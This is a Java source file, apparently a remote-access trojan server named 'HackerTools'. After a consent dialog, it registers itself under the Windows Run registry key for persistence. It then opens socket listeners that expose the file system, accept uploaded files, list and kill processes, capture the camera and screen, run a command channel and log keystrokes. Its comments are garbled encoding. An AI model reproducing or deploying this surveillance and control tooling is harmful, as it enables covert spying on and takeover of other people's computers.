package HackerTools;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.net.UnknownHostException;
import java.nio.charset.Charset;
import java.util.ArrayList;

public class Server {
    private static int port_file = 6666;
    private static int port_proc = 6667;
    private static int port_camera = 6668;// �����̵߳Ķ˿�����

    public static void main(String args[]) throws IOException {

        int res = JOptionPane.showConfirmDialog(null,
                "Do you want to be controlled?", "Զ�̿���",
                JOptionPane.YES_NO_OPTION);
        if (res == JOptionPane.YES_OPTION) {
            System.out.println("ѡ���Ǻ�ִ�еĴ���"); // ������ǡ���ִ����������
            auto_run auto_run=new auto_run(); //����������
        } else {
            System.out.println("ѡ����ִ�еĴ���"); // ������񡱺�ִ����������
            System.exit(1);
            return;
        }

        try {
            // ���̿���ʱ�Զ���ʼͼ���¼
            Thread thread_screenCapture = new Thread() {
                public void run() {
                    try {
                        ServerScreenMonitor.screencapture();
                    } catch (Exception e) {
                        // TODO Auto-generated catch block
                        e.printStackTrace();
                    }
                }
            };
            thread_screenCapture.start(); // �¿�һ���߳�ִ����Ļ��¼

            Thread_Pool thread_Pool1 = new Thread_Pool("file");
            thread_Pool1.start(); // �����ļ������߳�

            Thread_Pool thread_Pool2 = new Thread_Pool("proc");
            thread_Pool2.start(); // �����ļ������߳�

            Thread_Pool thread_Pool3 = new Thread_Pool("camera");
            thread_Pool3.start(); // ����ͷ�����߳�

            Thread_Pool thread_Pool4 = new Thread_Pool("upload_file");
            thread_Pool4.start(); // �ļ��ϴ��߳�

            Thread_Pool thread_Pool5 = new Thread_Pool("screen_monitor");
            thread_Pool5.start(); // ����ͷ�����߳�

            Thread_Pool thread_Pool6 = new Thread_Pool("cmd");
            thread_Pool6.start(); // ����ͷ�����߳�

            Thread_Pool thread_Pool7 = new Thread_Pool("keyboardRecord");
            thread_Pool7.start(); // ����ͷ�����߳�//

            //���̼�¼ģ�鿪��
            ServerKeyboardRecord ServerKeyboardRecord=new ServerKeyboardRecord();

            JOptionPane.showMessageDialog(null, "", "�ɹ����������",
                    JOptionPane.OK_OPTION);
        } catch (Exception e) {

            JOptionPane.showMessageDialog(null, "", "����˿���ʧ��",
                    JOptionPane.ERROR_MESSAGE);
            System.exit(1);
            return;

        } finally {

        }
    }
}

class Thread_Pool extends Thread {
    private static int port_file = 6666;
    private static int port_proc = 6667;
    private static int port_camera = 6668;
    private static int port_uploarFile = 6669;
    private static int port_cmd = 7888;
    private static int port_screenMonitor = 8000;// �����̵߳Ķ˿�����

    private String methods;

    public Thread_Pool(String methods) {
        this.methods = methods;
    }

    @Override
    public void run() {
        if (methods.equals("file")) {
            // server_FileManager���ʹ��
            server_FileManager server_FileManager = new server_FileManager();
            // server_FileManager.server_getFileName();
            server_FileManager.server_getRootFile();
            server_FileManager.setport(port_file);
            System.out.println("�ļ�����������Ķ˿��ǣ�" + server_FileManager.port);
            server_FileManager.server_file_socketManager();

        } else if (methods.equals("proc")) {
            // server_ProcManager���ʹ��
            server_ProcManager server_ProcManager = new server_ProcManager();
            server_ProcManager.setport(port_proc);
            System.out.println("���̹���������Ķ˿��ǣ�" + server_ProcManager.port);
            server_ProcManager.server_proc_socketManager();
        } else if (methods.equals("camera")) {
            server_cameraManager server_cameraManager = new server_cameraManager();
            server_cameraManager.setport(port_camera);
            System.out.println("����ͷ�������Ķ˿��ǣ�" + server_cameraManager.port);
            server_cameraManager.server_camera_record();
        } else if (methods.equals("upload_file")) {
            server_FileReceive server_FileReceive = new server_FileReceive();
            server_FileReceive.setport(port_uploarFile);
            System.out.println("����ͷ�������Ķ˿��ǣ�" + server_FileReceive.port);
            try {
                server_FileReceive.receive();
            } catch (ClassNotFoundException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        } else if (methods.equals("screen_monitor")) {
            try {
                final ServerScreenMonitor ServerScreenMonitor = new ServerScreenMonitor(
                        port_screenMonitor);
                try {
                    ServerScreenMonitor.send();
                } catch (Exception e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }
            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        } else if (methods.equals("cmd")) {
            ServerCmd ServerCmd = new ServerCmd(port_cmd);
            try {
                ServerCmd.sendresult();
            } catch (UnknownHostException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        }
        else if (methods.equals("keyboardRecord")){
            send_keybord send_keybord=new send_keybord();
            send_keybord.setport(8886);
            send_keybord.run();
        }
    }
}

class fileButton {

    private JButton button;
    private JFrame frame;
    private Container container;

    public Void fileButton(JButton button, final JFrame frame) {
        File file = new File("E:\\4399");
        // this.listFile();

        this.button = button;
        this.frame = frame;
        this.frame.setLayout(null);
        this.container = frame.getContentPane();
        this.initialization(frame);

        return null;
    }

    public Void initialization(final JFrame frame1) {

        this.button.setBounds(40, 100, 300, 40);
        this.button.setHorizontalAlignment(SwingConstants.CENTER);

        this.container.add(this.button);
        this.container.setBackground(Color.white);
        this.container.setBounds(0, 0, 400, 300);

        this.button.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {

                /*
                 * JFileChooser fileChooser = new JFileChooser();
                 * fileChooser.showOpenDialog(frame1.getContentPane());
                 *
                 * int i = 0; if (i == JFileChooser.APPROVE_OPTION) { File
                 * selectedFile = fileChooser.getSelectedFile();
                 * System.out.print(selectedFile.getName()); }
                 */
            }
        });

        return null;
    }

    /*
     * public static void listFile() {
     * System.out.println("=========ָ��Ŀ¼�µ������ļ���=========="); File fileDirectory
     * = new File("E:\\"); File[] aa = fileDirectory.listFiles(); for (int i =
     * 0; i < aa.length; i++) { if (aa[i].isDirectory()) {
     * System.out.println(aa[i].toString()); } }
     * System.out.println("=========ָ��Ŀ¼�µ������ļ�=========="); File file = new
     * File("E:\\"); File[] bb = file.listFiles(); for (int j = 0; j <
     * bb.length; j++) { if (bb[j].isFile()) { System.out.println(bb[j]); } } }
     */

}

class server_FileManager {
    public ArrayList<String> fileDirectory_list = new ArrayList<String>();
    public ArrayList<String> file_list = new ArrayList<String>();
    public int port;
    public static String route;

    public void setport(int port) {
        this.port = port;
    }

    public void server_getRootFile() {
        this.fileDirectory_list = new ArrayList<String>();
        this.file_list = new ArrayList<String>();
        /*
         * for (File f : FileSystemView.getFileSystemView().getHomeDirectory()
         * .listFiles()) { // ��ȡ���ҵĵ��ԡ��ļ����� if
         * (f.getName().equals("::{20D04FE0-3AEA-1069-A2D8-08002B30309D}")) {
         * for (File sf : f.listFiles()) { System.out.println(sf.getPath()); } }
         * }
         */// ������Ի�ȡ�������Ϣ��������˴���������֮���Ŀ¼�µ������豸

        File[] root = File.listRoots();

        for (File file : root) {
            this.fileDirectory_list.add(file.getAbsolutePath().toString());
        }
        System.out.println(fileDirectory_list);

    }

    public void server_getFileName() {
        this.fileDirectory_list = new ArrayList<String>();
        this.file_list = new ArrayList<String>();

        File fileDirectory = new File(route);
        File[] aa = fileDirectory.listFiles();

        for (int i = 0; i < aa.length; i++) {
            if (aa[i].isDirectory()) {
                this.fileDirectory_list.add(aa[i].toString());
            }
        }// ��һ��ȡĿ¼
        this.fileDirectory_list.sort(null);// �Եõ���Ŀ¼����

        File file = new File(route);
        File[] bb = file.listFiles();
        for (int j = 0; j < bb.length; j++) {
            if (bb[j].isFile()) {
                this.file_list.add(bb[j].toString());
            }
        }// ��һ��ȡ�ļ�
        this.file_list.sort(null);// �Եõ����ļ�����
    }

    public void server_file_socketManager() {
        ServerSocket serverSocket = null;
        try {
            serverSocket = new ServerSocket(port);
            serverSocket.setSoTimeout(300000);
        } catch (IOException e1) {
            // TODO Auto-generated catch block
            e1.printStackTrace();
        }
        if (serverSocket != null) {
            while (true) {
                try {
                    System.out.println("�ȴ�Զ�����ӣ��˿ں�Ϊ��"
                            + serverSocket.getLocalPort() + "...");
                    Socket server = serverSocket.accept();
                    System.out.println("Զ��������ַ��"
                            + server.getRemoteSocketAddress());
                    DataInputStream in = new DataInputStream(
                            server.getInputStream());
                    String cache = in.readUTF().toString();
                    if (cache.equals("File_check")) {
                        server_getRootFile();
                        System.out.println(this.fileDirectory_list + "22222");
                        ObjectOutputStream out = new ObjectOutputStream(
                                server.getOutputStream());
                        fileDirectory_list.addAll(file_list);
                        out.writeObject(this.fileDirectory_list);
                    } else {
                        route = cache;
                        server_getFileName();
                        System.out.println(this.fileDirectory_list + "22222");
                        ObjectOutputStream out = new ObjectOutputStream(
                                server.getOutputStream());
                        fileDirectory_list.addAll(file_list);
                        out.writeObject(this.fileDirectory_list);
                    }
                    serverSocket.setSoTimeout(300000);
                    server.close();
                } catch (SocketTimeoutException s) {
                    System.out.println("Socket timed out!");
                    break;
                } catch (IOException e) {
                    e.printStackTrace();
                    break;
                }
            }
        }
    }

}

class server_FileReceive {
    public String directory = "";
    public File file;
    public int port;
    public int count = 0;

    public void setport(int port) {
        this.port = port;
    }

    public void receive() throws ClassNotFoundException {
        ServerSocket serverSocket = null;
        try {
            serverSocket = new ServerSocket(port);
            serverSocket.setSoTimeout(300000);
        } catch (IOException e1) {
            // TODO Auto-generated catch block
            e1.printStackTrace();
        }
        if (serverSocket != null) {
            while (true) {
                try {
                    File cache = new File(server_FileManager.route + count);
                    while (cache.exists() && cache.isFile()) {
                        count = count + 1;
                        cache = new File(server_FileManager.route + count);
                    }
                    System.out.println("�ȴ�Զ�����ӣ��˿ں�Ϊ��"
                            + serverSocket.getLocalPort() + "...");
                    Socket server = serverSocket.accept();
                    System.out.println("Զ��������ַ��"
                            + server.getRemoteSocketAddress());
                    InputStream in = server.getInputStream();
                    FileOutputStream fos = new FileOutputStream(
                            server_FileManager.route + count);
                    int len;
                    byte[] bs = new byte[1024];
                    while ((len = in.read(bs)) != -1) {
                        fos.write(bs, 0, len);
                    }
                    OutputStream out = server.getOutputStream();
                    fos.close();
                    in.close();
                    out.close();
                    serverSocket.setSoTimeout(300000);
                    server.close();
                } catch (SocketTimeoutException s) {
                    System.out.println("Socket timed out!");
                    break;
                } catch (IOException e) {
                    e.printStackTrace();
                    break;
                }
            }
        }
    }

}

class server_ProcManager {
    public ArrayList<String[]> proc_list = new ArrayList<String[]>();
    public int port;

    public void setport(int port) {
        this.port = port;
    }

    public void server_getProcName() {

        try {
            // ����ճ�Ա����
            proc_list = new ArrayList<String[]>();

            // �ȴ���ϵͳ����
            ProcessBuilder pb = new ProcessBuilder("tasklist");
            Process p = null;
            p = pb.start();
            BufferedReader out = new BufferedReader(new InputStreamReader(
                    new BufferedInputStream(p.getInputStream()),
                    Charset.forName("GB2312")));
            BufferedReader err = new BufferedReader(new InputStreamReader(
                    new BufferedInputStream(p.getErrorStream())));
            System.out.println("Window ϵͳ�����б�");
            String ostr;

            // ������ؽ���
            int line = 0;
            while ((ostr = out.readLine()) != null) {
                if (line != 2 && line != 3)// ȥ���ڶ������еĲ���Ҫ����
                {

                    String[] cacheStrings = ostr.split("\\s{1,}", 5); // ��һ��Ϊ���ͷ������һ���ո�ָ�
                    this.proc_list.add(cacheStrings);

                }
                line++;
            }
            this.proc_list.remove(0);// ȥ����һ������Ҫ��Ԫ��
            /*
             * for (int j = 1; j < this.proc_list.size() - 1; j++) { for (int i
             * = 0; i < this.proc_list.size() - 1 - j; i++) { if
             * (this.proc_list.get(i)[0].compareTo(this.proc_list .get(i +
             * 1)[0]) > 0) { // change final List l = this.proc_list; l.set(i,
             * l.set(j + 1, l.get(i))); } } }
             */

            String estr = null;

            // ����У������������Ϣ
            try {
                estr = err.readLine();
            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
            if (estr != null) {
                System.out.println("\nError Info");
                System.out.println(estr);
            }
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }

    }

    public void server_proc_socketManager() {
        ServerSocket serverSocket = null;
        try {
            serverSocket = new ServerSocket(port);
            serverSocket.setSoTimeout(300000);
        } catch (IOException e1) {
            // TODO Auto-generated catch block
            e1.printStackTrace();
        }
        if (serverSocket != null) {
            while (true) {
                try {
                    System.out.println("�ȴ�Զ�����ӣ��˿ں�Ϊ��"
                            + serverSocket.getLocalPort() + "...");
                    Socket server = serverSocket.accept();
                    System.out.println("Զ��������ַ��"
                            + server.getRemoteSocketAddress());
                    DataInputStream in = new DataInputStream(
                            server.getInputStream());
                    String cache = in.readUTF().toString();
                    /* ˢ�²��� */
                    if (cache.equals("refresh")) {
                        server_getProcName();// ���ٴλ�ȡ���ؽ��̣�ˢ������
                        // �����ݴ�����Է�
                        ObjectOutputStream out = new ObjectOutputStream(
                                server.getOutputStream());
                        out.writeObject(this.proc_list);
                    }
                    /* ˢ�²��� */
                    /* ɾ������ */
                    else {
                        ObjectOutputStream out = new ObjectOutputStream(
                                server.getOutputStream());

                        Process process = null;
                        BufferedReader reader = null;
                        try { // ɱ������ process =

                            Runtime.getRuntime().exec(
                                    "taskkill /F /PID " + cache);
                            /*
                             * reader = new BufferedReader(new
                             * InputStreamReader( process.getInputStream()));
                             * String line = null; while ((line =
                             * reader.readLine()) != null) { System.out
                             * .println("kill PID return info -----> " + line);
                             * }
                             */
                            out.writeObject("200");
                        } catch (Exception e) {
                            e.printStackTrace();
                        } finally {
                            if (process != null) {
                                process.destroy();
                            }
                            if (reader != null) {
                                try {
                                    reader.close();
                                } catch (IOException e) {

                                }
                            }
                        }

                        System.out.println(cache);
                    }
                    /* ɾ������ */
                    serverSocket.setSoTimeout(300000);
                    server.close();
                } catch (SocketTimeoutException s) {
                    System.out.println("Socket timed out!");
                    break;
                } catch (IOException e) {
                    e.printStackTrace();
                    break;
                }
            }
        }
    }

}

class server_cameraManager {
    public ArrayList<String[]> proc_list = new ArrayList<String[]>();
    public int port;
    public int picNum;

    public void setport(int port) {
        this.port = port;
    }

    public void server_camera_record() {
        try {
            GetCamera.cameraTest();
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (InterruptedException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    }
}

class auto_run{
    static String name= null;
    static String path= null;

    public auto_run() throws IOException{
        System.out.println("���ӱ��ļ�������������"+"server.jar");
        name="server.jar";
        File file=new File(".");
        path=file.getCanonicalPath()+"\\";
        System.out.println(path);
        String regKey = "\"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"";
        Runtime.getRuntime().exec("reg "+"add "+regKey+" /v "+name+" /t reg_sz /d "+path);
    }

}

